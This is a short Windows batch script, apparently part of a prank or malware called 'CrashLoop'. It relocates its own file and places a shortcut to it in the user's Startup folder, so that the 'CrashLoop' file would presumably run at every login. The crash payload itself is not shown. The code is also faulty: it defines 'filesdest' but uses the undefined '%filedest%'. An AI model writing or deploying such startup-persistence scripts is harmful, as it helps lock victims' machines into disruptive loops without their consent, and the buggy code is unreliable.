@echo off
set "filepath=CrashLoop.bat"
rem Get the current user's startup folder location
set "racourcipath=CrashLoop - Raccourci"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

set "filesdest=C:\Program Files"

rem Move the shortcut to the startup folder
move "%filepath%" "%filedest%"
move "%racourcipath%" "%startupFolder%"